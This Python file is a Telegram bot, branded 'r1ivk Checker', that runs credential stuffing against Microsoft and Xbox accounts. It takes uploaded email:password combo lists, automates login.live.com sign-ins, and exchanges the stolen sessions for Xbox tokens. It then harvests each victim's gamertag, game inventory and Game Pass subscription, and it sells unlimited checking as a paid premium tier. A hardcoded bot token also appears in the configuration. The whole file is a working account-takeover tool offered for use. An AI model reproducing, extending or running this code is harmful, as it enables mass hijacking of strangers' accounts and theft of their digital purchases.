# -*- coding: utf-8 -*-
"""
TELEGRAM TURBO XBOX CHECKER BOT - R1IVK CHECKER ULTIMATE EDITION (DIRECT LOCAL IP / NO PROXIES)
"""

import os
import re
import time
import random
import sqlite3
import requests
import threading
import concurrent.futures
from urllib.parse import urlparse, parse_qs
import urllib3
from requests.adapters import HTTPAdapter
import telebot
from telebot import types

urllib3.disable_warnings()

# =================== CONFIGURATION ===================
BOT_TOKEN = "8896382526:AAFMror2dFQ1U0r6RRHrrya2PKuyuoTRtnw"
OWNER_USERNAME = "@r1ivk"
bot = telebot.TeleBot(BOT_TOKEN)

# =================== DATABASE SETUP ===================
def init_db():
    conn = sqlite3.connect('checker_users.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            is_premium INTEGER DEFAULT 0,
            joined_date TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def is_user_premium(user_id):
    if user_id in [123456789]: 
        return True
    conn = sqlite3.connect('checker_users.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('SELECT is_premium FROM users WHERE user_id = ?', (user_id,))
    row = cursor.fetchone()
    conn.close()
    return row[0] == 1 if row else False

def add_user_to_db(user_id):
    conn = sqlite3.connect('checker_users.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('INSERT OR IGNORE INTO users (user_id, is_premium, joined_date) VALUES (?, 0, ?)', 
                   (user_id, time.strftime('%Y-%m-%d %H:%M:%S')))
    conn.commit()
    conn.close()

# =================== GLOBALS ===================
active_scans = {}  
scan_lock = threading.Lock()

# =================== BYPASS & CORE LOGIC ===================
def extract_ppft(text):
    patterns = [
        r'name="PPFT"[^>]*value="([^"]+)"',
        r'value="([^"]+)"[^>]*name="PPFT"',
        r'"PPFT":"([^"]+)"',
        r'"sFTTag":"<input[^>]*value=\\"([^\\"]+)\\"',
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            token = match.group(1)
            token = token.replace('\\/', '/').replace('\\"', '"').replace('\\x26', '&')
            return token
    return None

def extract_url_post(text):
    patterns = [
        r'"urlPost":"([^"]+)"',
        r"urlPost:'([^']+)'",
        r'id="fmHF"\s+action="([^"]+)"',
    ]
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            url = match.group(1)
            url = url.replace('\\/', '/')
            return url
    return None

def check_account_turbo(combo, user_state):
    if not user_state.get('is_running', True):
        return

    parts = combo.split(':')
    if len(parts) < 2:
        with user_state['lock']:
            user_state['bad'] += 1
            user_state['checked'] += 1
        return

    email = parts[0].strip()
    password = ':'.join(parts[1:]).strip()
    adapter = HTTPAdapter(pool_connections=50, pool_maxsize=50)
    session = None

    for attempt in range(2):
        if not user_state.get('is_running', True):
            return

        session = requests.Session()
        session.verify = False
        session.mount('https://', adapter)
        session.mount('http://', adapter)
        
        # تم إلغاء البروكسيات واستخدام الـ IP الحقيقي المباشر (Local IP)

        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        })

        try:
            sftag_url = (
                "https://login.live.com/oauth20_authorize.srf"
                "?client_id=00000000402B5328"
                "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
                "&scope=service::user.auth.xboxlive.com::MBI_SSL"
                "&display=touch"
                "&response_type=token"
                "&locale=en"
            )
            resp = session.get(sftag_url, timeout=10)
            text = resp.text

            sftag = extract_ppft(text)
            url_post = extract_url_post(text)

            if not sftag or not url_post:
                with user_state['lock']:
                    user_state['errors'] += 1
                    user_state['checked'] += 1
                session.close()
                return

            login_data = {
                'login': email,
                'loginfmt': email,
                'passwd': password,
                'PPFT': sftag,
                'type': '11',
                'NewUser': '1',
                'LoginOptions': '3',
                'i19': '0',
            }
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': sftag_url,
                'Origin': 'https://login.live.com',
            }
            login_req = session.post(url_post, data=login_data, headers=headers, allow_redirects=True, timeout=10)

            ms_token = None
            login_text = login_req.text.lower()

            if 'access_token' in login_req.url:
                ms_token = parse_qs(urlparse(login_req.url).fragment).get('access_token', [None])[0]
            elif 'access_token' in login_text:
                token_match = re.search(r'access_token=([^&\s\"\']+)', login_text)
                if token_match:
                    ms_token = token_match.group(1)
            elif any(x in login_text for x in ["password is incorrect", "account doesn't exist", "passwords don't match", "that password is incorrect", "account or password is incorrect"]):
                with user_state['lock']:
                    user_state['bad'] += 1
                    user_state['checked'] += 1
                session.close()
                return
            elif any(x in login_text for x in ["recover", "identity/confirm", "abuse", "locked", "help us protect", "verify your identity", "security challenge", "two-step"]):
                with user_state['lock']:
                    user_state['twofa'] += 1
                    user_state['checked'] += 1
                session.close()
                return
            elif 'cancel?mkt=' in login_text or 'kmsi' in login_text or 'stay signed in' in login_text:
                try:
                    ipt_match = re.search(r'"ipt" value="(.+?)"', login_req.text)
                    pprid_match = re.search(r'"pprid" value="(.+?)"', login_req.text)
                    uaid_match = re.search(r'"uaid" value="(.+?)"', login_req.text)
                    action_match = re.search(r'id="fmHF" action="(.+?)"', login_req.text) or re.search(r'action="([^"]+)"', login_req.text)

                    if ipt_match and pprid_match and uaid_match and action_match:
                        data2 = {
                            'ipt': ipt_match.group(1),
                            'pprid': pprid_match.group(1),
                            'uaid': uaid_match.group(1),
                            'LoginOptions': '3',
                            'type': '11',
                        }
                        ret = session.post(action_match.group(1), data=data2, allow_redirects=True, timeout=10)
                        if 'access_token' in ret.url:
                            ms_token = parse_qs(urlparse(ret.url).fragment).get('access_token', [None])[0]
                except Exception:
                    pass

            if not ms_token:
                with user_state['lock']:
                    user_state['bad'] += 1
                    user_state['checked'] += 1
                session.close()
                return

            # Xbox Live Authentication
            xb_payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
            xb_headers = {'Content-Type': 'application/json', 'Accept': 'application/json'}
            xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, headers=xb_headers, timeout=10)

            if xb_req.status_code != 200:
                with user_state['lock']:
                    user_state['bad'] += 1
                    user_state['checked'] += 1
                session.close()
                return

            xb_token = xb_req.json()['Token']
            uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']

            # جلب البيانات الحقيقية من بروفايل الايميل واكسبرس
            gamertag, gamerscore = "Not Found", "0"
            try:
                xsts_xb_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
                xsts_xb_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, headers=xb_headers, timeout=10)
                if xsts_xb_req.status_code == 200:
                    xsts_xb_token = xsts_xb_req.json()['Token']
                    prof_req = session.get(
                        "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore,PublicGamerpic", 
                        headers={"Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}", "x-xbl-contract-version": "2"}, 
                        timeout=10
                    )
                    if prof_req.status_code == 200:
                        settings = prof_req.json().get('profileUsers', [{}])[0].get('settings', [])
                        for s in settings:
                            if s['id'] == 'Gamertag': gamertag = str(s['value'])
                            if s['id'] == 'Gamerscore': gamerscore = str(s['value'])
            except Exception:
                pass

            has_gp, gp_type = False, "Free Account"
            is_minecraft = "NO"
            games_list = []
            
            # جلب الألعاب واشتراكات المتجر الحقيقية
            try:
                xsts_store_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://licensing.xboxlive.com", "TokenType": "JWT"}
                xsts_store_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_store_payload, headers=xb_headers, timeout=10)
                
                if xsts_store_req.status_code == 200:
                    xsts_store_token = xsts_store_req.json()['Token']
                    inv_req = session.get(
                        "https://inventoryservices.xboxlive.com/users/me/inventory/items?type=Game",
                        headers={"Authorization": f"XBL3.0 x={uhs};{xsts_store_token}", "x-xbl-contract-version": "1"},
                        timeout=10
                    )
                    if inv_req.status_code == 200:
                        items = inv_req.json().get("items", [])
                        for item in items:
                            name = item.get("name") or item.get("productId") or item.get("titleId")
                            if name and str(name) not in games_list:
                                games_list.append(str(name))
                                if "minecraft" in str(name).lower():
                                    is_minecraft = "YES"

                # فحص الاشتراكات بدقة أكبر
                sub_req = session.get(
                    "https://purchase.mp.microsoft.com/v7/policies/subscriptions",
                    headers={"Authorization": f"XBL3.0 x={uhs};{xb_token}"},
                    timeout=10
                )
                if sub_req.status_code == 200:
                    sub_text = sub_req.text.lower()
                    if "ultimate" in sub_text:
                        gp_type = "Xbox Game Pass Ultimate"
                        has_gp = True
                    elif "pc game pass" in sub_text or "game pass for pc" in sub_text:
                        gp_type = "PC Game Pass"
                        has_gp = True
                    elif "game pass" in sub_text:
                        gp_type = "Xbox Game Pass"
                        has_gp = True
            except Exception:
                pass

            # بناء مظهر الهيت ليعطيك معلومات واضحة وصحيحة تماماً
            hit_block = f"""{email}:{password}
━━━━━━━━━━━━━━━━━━━━━━━━━━
🎮 Gamertag: {gamertag}
⭐ Gamerscore: {gamerscore}G
🔥 Subscription: {gp_type}
🧱 Minecraft: {is_minecraft}
--------------------------
📦 Games / Products found:"""
            
            if games_list:
                for idx, g in enumerate(games_list[:15], 1): 
                    hit_block += f"\n  {idx}. {g}"
                if len(games_list) > 15:
                    hit_block += f"\n  ... and {len(games_list) - 15} more items."
            else:
                hit_block += "\n  (Direct Inventory API returned empty or account has no digital purchases)"
            
            hit_block += f"\n{'='*42}\n"

            with user_state['lock']:
                user_state['hits_list'].append(hit_block)
                user_state['hits'] += 1
                user_state['checked'] += 1
            if session:
                session.close()
            return

        except Exception:
            if session:
                session.close()
            continue

    with user_state['lock']:
        user_state['bad'] += 1
        user_state['checked'] += 1

# =================== TELEGRAM UI & HANDLERS ===================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    add_user_to_db(message.chat.id)
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn_checker = types.InlineKeyboardButton("🚀 Start r1ivk Checker", callback_data="start_checker")
    btn_status = types.InlineKeyboardButton("📊 Account Status & Limits", callback_data="check_status")
    btn_channel = types.InlineKeyboardButton("📢 Official Channel", url=f"https://t.me/{OWNER_USERNAME.replace('@','')}")
    btn_buy = types.InlineKeyboardButton("💎 Buy Premium (15$ / 30 Days)", url=f"https://t.me/{OWNER_USERNAME.replace('@','')}")
    
    markup.add(btn_checker, btn_status, btn_channel, btn_buy)
    
    welcome_text = (
        "👑 *Welcome to r1ivk Checker Official Panel (Direct IP Mode)* ⚡\n\n"
        "The fastest and most powerful tool for checking Xbox and Microsoft accounts with accurate profile reading.\n\n"
        "📌 *Choose an option below to get started:*"
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "start_checker")
def callback_checker(call):
    bot.answer_callback_query(call.id, "Opening checker interface...")
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("❌ Cancel & Return Home", callback_data="back_home"))
    
    text = (
        "🚀 *Live Checker Mode Activated (Direct IP)*\n\n"
        "📁 Please send your combo file now in (`.txt`) format where each line is:\n"
        "`email:password`\n\n"
        "📌 *Note:* Free version supports up to **10,000 lines** max.\n"
        "💎 To remove limits and unlock unlimited lines, contact owner: {OWNER_USERNAME}"
    ).format(OWNER_USERNAME=OWNER_USERNAME)
    
    bot.edit_message_text(text, chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "check_status")
def callback_status(call):
    chat_id = call.message.chat.id
    is_prem = is_user_premium(chat_id)
    status_text = "💎 Premium (Unlimited)" if is_prem else "👤 Free (Max 10,000 lines)"
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_home"))
    
    bot.answer_callback_query(call.id)
    bot.edit_message_text(f"📊 *Your Account Info:*\n\n• User ID: `{chat_id}`\n• Account Type: *{status_text}*", chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data in ["cancel_scan", "refresh_stats", "back_home"])
def handle_callbacks(call):
    chat_id = call.message.chat.id
    if call.data == "cancel_scan":
        if chat_id in active_scans:
            active_scans[chat_id]['is_running'] = False
        bot.answer_callback_query(call.id, "Scan stopped.")
        bot.edit_message_text("❌ *Scan stopped manually by user.*", chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown")
    elif call.data == "refresh_stats":
        bot.answer_callback_query(call.id, "Stats refreshed!")
    elif call.data == "back_home":
        bot.answer_callback_query(call.id, "Returning home...")
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(
            types.InlineKeyboardButton("🚀 Start r1ivk Checker", callback_data="start_checker"),
            types.InlineKeyboardButton("📊 Account Status & Limits", callback_data="check_status"),
            types.InlineKeyboardButton("📢 Official Channel", url=f"https://t.me/{OWNER_USERNAME.replace('@','')}")
        )
        bot.edit_message_text("👑 *Welcome back to the main menu:*", chat_id=chat_id, message_id=call.message.message_id, parse_mode="Markdown", reply_markup=markup)

@bot.message_handler(content_types=['document'])
def handle_file(message):
    chat_id = message.chat.id
    if not message.document.file_name.endswith('.txt'):
        bot.send_message(chat_id, "⚠️ Error: Please send a text file with a `.txt` extension only!")
        return

    is_prem = is_user_premium(chat_id)

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        file_path = f"combo_{chat_id}.txt"
        with open(file_path, 'wb') as f:
            f.write(downloaded_file)

        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            combos = [line.strip() for line in f if ':' in line]

        if not combos:
            bot.send_message(chat_id, "⚠️ The file is empty or formatting is incorrect!")
            return

        unique_combos = list(dict.fromkeys(combos))

        if not is_prem and len(unique_combos) > 10000:
            bot.send_message(chat_id, f"⚠️ *Limit Exceeded!*\nYour file contains {len(unique_combos)} lines.\nFree version supports up to **10,000 lines**.\n\nTo upgrade your account, contact: {OWNER_USERNAME} (15$ / 30 Days)", parse_mode="Markdown")
            return

        markup = types.InlineKeyboardMarkup()
        markup.row(types.InlineKeyboardButton("🛑 Stop Scan", callback_data="cancel_scan"))
        markup.row(types.InlineKeyboardButton("🔄 Refresh Stats", callback_data="refresh_stats"))
        markup.row(types.InlineKeyboardButton("🔙 Main Menu", callback_data="back_home"))

        status_msg = bot.send_message(chat_id, "🔥 *Starting Deep Scan Engine (Direct IP Mode)...*", parse_mode="Markdown", reply_markup=markup)

        user_state = {
            'chat_id': chat_id,
            'checked': 0,
            'total': len(unique_combos),
            'hits': 0,
            'bad': 0,
            'twofa': 0,
            'errors': 0,
            'hits_list': [],
            'is_running': True,
            'lock': threading.Lock(),
            'start_time': time.time()
        }
        active_scans[chat_id] = user_state

        threading.Thread(target=update_stats_loop, args=(chat_id, status_msg.message_id, user_state), daemon=True).start()
        threading.Thread(target=run_turbo_scan, args=(unique_combos, user_state, status_msg.message_id), daemon=True).start()

    except Exception as e:
        bot.send_message(chat_id, f"❌ Error processing file: {e}")

def update_stats_loop(chat_id, msg_id, state):
    while state['is_running'] and state['checked'] < state['total']:
        time.sleep(2)
        elapsed = time.time() - state['start_time']
        cpm = int((state['checked'] / elapsed) * 60) if elapsed > 1 else 0
        
        pct = (state['checked'] / state['total']) * 100
        filled = int(pct / 10)
        bar = "█" * filled + "░" * (10 - filled)

        text = f"""🔥 *Live Scan Statistics Dashboard ({time.strftime('%H:%M:%S')})*

📊 *Total:*         {state['total']}
✓ *Checked:*     {state['checked']}
✗ *Bad:*         {state['bad']}
★ *Hits:*        {state['hits']}
🔒 *2FA / Locked:* {state['twofa']}
⚠ *Errors:*        {state['errors']}

Progress: {pct:.1f}%
\\[{bar}\\]

⚡ *Speed (CPM):* {cpm}
⏱️ *Elapsed Time:* {time.strftime('%H:%M:%S', time.gmtime(elapsed))}"""

        try:
            markup = types.InlineKeyboardMarkup()
            markup.row(types.InlineKeyboardButton("🛑 Stop Scan", callback_data="cancel_scan"))
            markup.row(types.InlineKeyboardButton("🔄 Refresh Stats", callback_data="refresh_stats"))
            markup.row(types.InlineKeyboardButton("🔙 Main Menu", callback_data="back_home"))
            bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id, parse_mode="Markdown", reply_markup=markup)
        except Exception:
            pass

def run_turbo_scan(combos, state, msg_id):
    threads = 10  # تم ضبط عدد الثريدز خصيصاً للعمل باستقرار وثبات على الآبي الشخصي دون تسبب بحظر فوري
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(check_account_turbo, combo, state) for combo in combos]
        concurrent.futures.wait(futures)

    state['is_running'] = False
    elapsed = time.time() - state['start_time']
    
    final_text = f"""✅ *Xbox Profile & Inventory Scan Completed!*

📊 *Total:*         {state['total']}
★ *Successful Hits:* {state['hits']}
🔒 *Two-Factor (2FA):* {state['twofa']}
✗ *Bad Accounts:*    {state['bad']}

⏱️ *Time Taken:* {time.strftime('%H:%M:%S', time.gmtime(elapsed))}"""

    try:
        bot.edit_message_text(final_text, chat_id=state['chat_id'], message_id=msg_id, parse_mode="Markdown")
    except Exception:
        pass

    if state['hits'] > 0:
        result_file_path = f"r1ivk_checker_hits_{int(time.time())}.txt"
        try:
            with open(result_file_path, 'w', encoding='utf-8') as f:
                f.write("🔥 r1ivk Checker ⚡ Direct IP Scan Results 🔥\n")
                f.write(f"📅 {time.strftime('%Y-%m-%d %H:%M:%S')} | 👑 Owner: {OWNER_USERNAME}\n")
                f.write("="*50 + "\n\n")
                f.writelines(state['hits_list'])
            
            with open(result_file_path, 'rb') as f:
                bot.send_document(state['chat_id'], f, caption=f"📁 *Detailed Hits Results File* (Total Hits: {state['hits']})", parse_mode="Markdown")
            
            os.remove(result_file_path)
        except Exception as e:
            bot.send_message(state['chat_id'], f"⚠️ Error sending results file: {e}")
    else:
        bot.send_message(state['chat_id'], "⚠️ Scan finished, no matching hits found.")

if __name__ == "__main__":
    print("[+] r1ivk Checker ⚡ Bot is running in Direct IP Mode...")
    bot.infinity_polling()
